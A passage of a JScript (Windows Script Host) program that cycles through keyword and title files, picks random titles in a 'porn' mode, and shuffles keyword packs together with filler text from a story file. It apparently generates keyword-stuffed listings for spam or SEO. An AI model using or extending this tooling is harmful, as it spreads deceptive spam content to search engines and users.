            } catch(kerr) {keywords = [];}
            if (stringElements.length==4)
                titles = stringElements[3].split(",");
            else if (titleMode != "serial") {
                try {
                    titles = stringElements[2].split(",");
                } catch(kerr) {titles = [];}
            }
            else{
                titles = ajax.listSerialTitles(filmname, id);
            }
            if(titles.length <= 3 && titleMode != "serial"){
                titles = [filmname]
            }
        }
        var fileLines = fso.getFile(filePath).OpenAsTextStream(1,0).readall().split("\r\n");
        var position = session(fso.getFileName(filePath));
        readLineData();
        var currentPack = "";
        while(currentPack.length < keysCount) {
            if (position.keywordIndex>=keywords.length-1) {
                if (!this.enableLoop && position.lineNumber>=fileLines.length-1){WScript.Echo("NO KEYS");WScript.Quit();}
                if (position.lineNumber>=fileLines.length-1)
                    position.lineNumber = 0;
                else
                    position.lineNumber++;
                position.keywordIndex=0;
                position.titleIndex=0;
                break;
            }
            currentPack+=keywords[position.keywordIndex]+"|";
            position.keywordIndex++;
        }
        if (titleMode=="porn") {
            var nowTitleIndex = parseInt(Math.random() * titles.length);
            // log("Readbase Titles length: "+titles.length);
            // titles[nowTitleIndex] = randomizeTitle(titles[nowTitleIndex]);

            filmname = titles[nowTitleIndex];
        }
        else
            nowTitleIndex = position.titleIndex;
        if (position.titleIndex>=titles.length-1)
            position.titleIndex = 0;
        else
            position.titleIndex++;
        session(fso.getFileName(filePath), position);
        //log("RETURNED TITLE: "+titles)

        ///////ADDED 05,11,16
        if(titles[nowTitleIndex].length < 3)
            titles[nowTitleIndex] = titles[parseInt(Math.random() * titles.length)];
        /////////

        if (this.mixing)
            return {id: id, filmname: filmname, title: titles[nowTitleIndex], keywords: mix(currentPack.split("|"),  readStory(1900 - keysCount, titleMode).split(" "))};
        else
            return {id: id, filmname: filmname, title: titles[nowTitleIndex], keywords: currentPack.split("|").join(" ")};
    }
    function shuffle(array) {
        var counter = array.length;
        while (counter > 0) {
            var index = Math.floor(Math.random() * counter);
            counter--;
            var temp = array[counter];
            array[counter] = array[index];
            array[index] = temp;
        }
        return array;
    }
    function mix(arr1, arr2) {
        var arr1 = arr1.concat(arr2);
        return shuffle(arr1).join(" ");
    }
    function readStory(count, title) {
        var file = fso.getFile(me + "/"+title+"_story_base.txt").OpenAsTextStream(1,0);
        var storyPosition = session(title+"_storyPosition");
        file.skip(storyPosition);
        // log("storyPosition: "+storyPosition)
        // log("count: "+ count)
        var result = file.read(count);
        if (file.atEndOfStream)
            session(title+"_storyPosition", 0);
        else
            session(title+"_storyPosition", storyPosition + count);
        file.close();
        return result;
    }
    function randomizeTitle(text) {
        var rWords = readStory(1000, "porn").split(" ");
        WScript.Echo("rWords count: " + rWords.length);
        var textWords = text.split(" ");
        for (var i=0;i<textWords.length;i+=2) {
            if (textWords[i].length<4) {i--;continue;}
            // if (textWords[i].length == 3) {
            // textWords[1] = rWords[i];
            // textWords[2] = rWords[i+1];
            // break;
            // }

            // textWords[i] = rWords[i];
            textWords[i] = ""; //forced! can be deleted
        }
        return textWords.join(" ");
        // return parseInt(100000 + Math.random() * 899999);
    }
}
//}catch(someerror){WScript.Echo("CATCH ERROR: "+someerror.message); WScript.Sleep(600000);}